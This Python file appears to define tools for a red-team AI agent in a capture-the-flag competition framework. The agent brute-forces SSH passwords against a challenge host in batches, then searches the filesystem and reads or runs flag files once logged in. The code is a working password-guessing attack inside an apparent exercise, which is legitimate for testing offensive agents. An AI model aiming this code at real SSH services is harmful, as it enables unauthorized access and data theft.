# -*- coding: utf-8 -*-
"""
CTF Red Agent Tools - Password brute force competitor
"""

import json
import time
import agentbeats as ab
from typing import Dict, Any, Optional
import os

# Import SDK utilities
from agentbeats.utils.commands import SSHClient
from agentbeats.utils.agents import send_message_to_agent
from agentbeats.logging import BattleContext, record_battle_event, record_agent_action

# Global state
battle_context = None
ssh_client = None
challenge_info = None
flag_found = None
current_battle_id = None
green_agent_url = None
agent_id = None  # Store the agent's identifier

@ab.tool
def process_incoming_message(message: str) -> str:
    """Automatically process incoming messages and route them to appropriate handlers."""
    try:
        print(f"Processing incoming message: {message[:200]}...")  # Log first 200 chars
        
        # Try to parse as JSON
        try:
            message_data = json.loads(message)
        except json.JSONDecodeError:
            return f"Received non-JSON message: {message[:100]}..."
        
        # Check if this looks like a challenge message
        if "battle_id" in message_data or "ssh_host" in message_data or "user_persona" in message_data:
            print("Detected challenge message, calling handle_challenge_start")
            return handle_challenge_start(message)
        
        # Check if this is a flag submission response
        if "flag" in message_data or "winner" in message_data:
            print("Detected flag submission response")
            return f"Received response: {message_data}"
        
        # Default: just return the message type
        message_type = message_data.get('type', 'unknown')
        return f"Received message of type: {message_type}"
        
    except Exception as e:
        error_msg = f"Error processing incoming message: {str(e)}"
        print(error_msg)
        return error_msg

@ab.tool
def handle_challenge_start(challenge_data: str) -> str:
    """Handle challenge start message from green agent."""
    global challenge_info, current_battle_id, green_agent_url, battle_context, agent_id
    
    try:
        # Parse challenge data
        challenge_info = json.loads(challenge_data)
        current_battle_id = challenge_info.get("battle_id", "ctf_password_brute_force")
        
        # Extract agent identifier from challenge data
        agent_id = challenge_info.get("agent_id", "red_agent_2")
        
        print(f"DEBUG: Parsed challenge_info: {challenge_info}")
        print(f"DEBUG: Raw challenge_data received: {challenge_data}")
        print(f"DEBUG: current_battle_id: {current_battle_id}")
        print(f"DEBUG: agent_id: {agent_id}")
        
        # Create battle context from challenge data
        battle_context_data = challenge_info.get("battle_context", {})
        print(f"DEBUG: battle_context_data: {battle_context_data}")
        
        battle_context = BattleContext(
            battle_id=battle_context_data.get("battle_id", current_battle_id),
            backend_url=battle_context_data.get("backend_url", "http://localhost:9000")
        )
        
        print(f"DEBUG: Created battle_context: {battle_context}")
        
        # Extract green agent URL from challenge data
        green_agent_url = challenge_info.get("green_agent_url")
        if not green_agent_url:
            print("Warning: No green_agent_url found in challenge data")
        
        # Log challenge start
        record_battle_event(
            battle_context,
            "Challenge received",
            agent_id,
            {
                "ssh_host": challenge_info.get("ssh_host"),
                "ssh_port": challenge_info.get("ssh_port"),
                "username": challenge_info.get("username")
            }
        )
        
        return f"Challenge received! Target: {challenge_info.get('ssh_host')}:{challenge_info.get('ssh_port')}"
        
    except Exception as e:
        error_msg = f"Error handling challenge: {str(e)}"
        print(f"Error in handle_challenge_start: {error_msg}")
        battle_id_to_use = current_battle_id or "ctf_password_brute_force"
        print(f"DEBUG: Logging error with battle_id: {battle_id_to_use} (current_battle_id: {current_battle_id})")
        
        # Create temporary battle context for error logging
        temp_context = BattleContext(battle_id=battle_id_to_use, backend_url="http://localhost:9000")
        record_battle_event(temp_context, f"Error: {error_msg}", agent_id or "red_agent")
        return error_msg

async def _try_ssh_password(password: str) -> str:
    """Helper function to try SSH connection with a specific password."""
    global ssh_client, challenge_info, flag_found, current_battle_id
    
    try:
        if not challenge_info:
            print(f"DEBUG: challenge_info is None, current_battle_id: {current_battle_id}")
            return "No challenge info available. Run handle_challenge_start first."
        
        # If we don't have challenge info but we have a password to try, 
        # it means we received a challenge message but didn't process it
        if not challenge_info and password:
            print("DEBUG: No challenge info but trying password - challenge message may not have been processed")
            return "Challenge message not processed. Please call handle_challenge_start first."
        
        # Create SSH client if not exists
        if ssh_client is None:
            credentials = {
                "username": challenge_info["username"],
                "password": password,
                "port": challenge_info["ssh_port"]
            }
            
            ssh_client = SSHClient(challenge_info["ssh_host"], credentials)
        
        # Try to connect with the password
        print(f"Trying password: {password}")
        
        # Update credentials with new password
        ssh_client.credentials["password"] = password
        
        # Try to connect
        if ssh_client.connect():
            print(f"✅ Successfully connected with password: {password}")
            
            # Try to find and read the flag file
            print("Searching for flag file...")
            
            # First, try to find flag files
            find_result = ssh_client.execute("find / -name '*flag*' -type f 2>/dev/null")
            print(f"Find result: {find_result}")
            
            # Try common flag locations and scripts
            flag_locations = [
                "/root/flag.txt",
                "/flag.txt", 
                "/home/flag.txt",
                "/tmp/flag.txt",
                "/var/flag.txt"
            ]
            
            # Also try to execute flag generation scripts
            flag_scripts = [
                "/root/generate_flag.py",
                "/generate_flag.py",
                "/home/generate_flag.py"
            ]
            
            flag_content = None
            
            # First try static flag files
            for location in flag_locations:
                print(f"Trying location: {location}")
                flag_result = ssh_client.execute(f"cat {location}")
                print(f"Flag result for {location}: {flag_result}")
                
                if flag_result and not flag_result.startswith("Error:") and not "No such file" in flag_result:
                    if flag_result.startswith("Success:"):
                        flag_content = flag_result.replace("Success:", "").strip()
                    else:
                        flag_content = flag_result.strip()
                    print(f"Found flag at {location}: {flag_content}")
                    break
            
            # If no static file found, try executing flag scripts
            if not flag_content:
                for script in flag_scripts:
                    print(f"Trying script: {script}")
                    flag_result = ssh_client.execute(f"python3 {script}")
                    print(f"Flag result for {script}: {flag_result}")
                    
                    if flag_result and not flag_result.startswith("Error:") and not "No such file" in flag_result:
                        if flag_result.startswith("Success:"):
                            flag_content = flag_result.replace("Success:", "").strip()
                        else:
                            flag_content = flag_result.strip()
                        print(f"Found flag from script {script}: {flag_content}")
                        break
            
            if not flag_content:
                return f"Connected but couldn't find flag file. Find result: {find_result}"
            
            # Set the found flag
            flag_found = flag_content
            
            # Log success
            record_agent_action(
                battle_context,
                "Flag found",
                agent_id or "red_agent",
                {
                    "password_used": password,
                    "flag": flag_content
                }
            )
            
            # Automatically submit the flag to the green agent
            try:
                import asyncio
                print(f"DEBUG: About to submit flag to green agent at {green_agent_url}")
                
                # Create a new event loop if one doesn't exist
                try:
                    loop = asyncio.get_event_loop()
                except RuntimeError:
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                
                # Submit the flag
                submission_result = await submit_flag_to_green_agent(flag_content)
                print(f"DEBUG: Flag submission completed: {submission_result}")
                
                return f"🎉 SUCCESS! Flag found: {flag_content} | Submission: {submission_result}"
            except Exception as e:
                print(f"DEBUG: Error submitting flag: {str(e)}")
                import traceback
                traceback.print_exc()
                return f"🎉 SUCCESS! Flag found: {flag_content} (but submission failed: {str(e)})"
        else:
            return f"❌ Failed to connect with password: {password}"
        
    except Exception as e:
        error_msg = f"Error trying SSH password: {str(e)}"
        record_battle_event(
            battle_context,
            f"Error: {error_msg}",
            agent_id or "red_agent"
        )
        return error_msg

@ab.tool
async def test_password_list(password_list: str) -> str:
    """Test a list of up to 10 passwords and return results."""
    try:
        passwords = json.loads(password_list)
        
        if not passwords:
            return "No passwords provided"
        
        # Limit to 10 passwords per batch
        if len(passwords) > 10:
            passwords = passwords[:10]
            print(f"Testing first 10 passwords out of {len(passwords)} total")
        
        # Log the batch of passwords being tested
        record_agent_action(
            battle_context,
            "Testing password batch",
            agent_id or "red_agent",
            {
                "passwords": passwords,
                "batch_size": len(passwords)
            }
        )
        
        results = []
        success_found = False
        
        for i, password in enumerate(passwords):
            print(f"Testing password {i+1}/{len(passwords)}: {password}")
            
            result = await _try_ssh_password(password)
            results.append(f"Password {i+1}: {password} - {result}")
            
            # If we found the flag, stop
            if "SUCCESS!" in result:
                success_found = True
                results.append("🎉 SUCCESS! Stopping password testing.")
                break
            
            # Small delay to avoid overwhelming the server
            time.sleep(0.5)
        
        summary = {
            "passwords_tested": len(passwords),
            "success_found": success_found,
            "results": results
        }
        
        return json.dumps(summary, indent=2)
        
    except Exception as e:
        return f"Error testing password list: {str(e)}"

@ab.tool
async def submit_flag_to_green_agent(flag_content: str) -> str:
    """Submit the found flag to the green agent with retry logic."""
    global green_agent_url, current_battle_id
    try:
        if not flag_content:
            return "No flag to submit"
        
        if not green_agent_url:
            return "Green agent URL not available. Run handle_challenge_start first."
        
        if not current_battle_id:
            return "Battle ID not available. Run handle_challenge_start first."
        
        # Send a structured message to the green agent with flag submission info
        submission_message = {
            "type": "flag_submission",
            "battle_id": current_battle_id,
            "agent_name": agent_id or "red_agent",
            "submitted_flag": flag_content
        }
        
        message = json.dumps(submission_message)
        
        # Retry logic - try up to 3 times with delays
        max_retries = 3
        for attempt in range(max_retries):
            try:
                print(f"Attempting to submit flag (attempt {attempt + 1}/{max_retries})")
                await send_message_to_agent(green_agent_url, message)
                
                # Log successful submission
                record_agent_action(
                    battle_context,
                    "Flag submitted successfully",
                    agent_id or "red_agent",
                    {"flag": flag_content, "attempt": attempt + 1}
                )
                
                return f"Flag submitted to green agent successfully (attempt {attempt + 1}): {flag_content}"
                
            except Exception as e:
                print(f"Attempt {attempt + 1} failed: {str(e)}")
                if attempt < max_retries - 1:
                    # Wait before retry (exponential backoff)
                    wait_time = (2 ** attempt) * 1  # 1s, 2s, 4s
                    print(f"Waiting {wait_time} seconds before retry...")
                    time.sleep(wait_time)
                else:
                    # Final attempt failed
                    raise e
        
    except Exception as e:
        error_msg = f"Error submitting flag after {max_retries} attempts: {str(e)}"
        record_battle_event(
            battle_context,
            f"Error: {error_msg}",
            agent_id or "red_agent"
        )
        return error_msg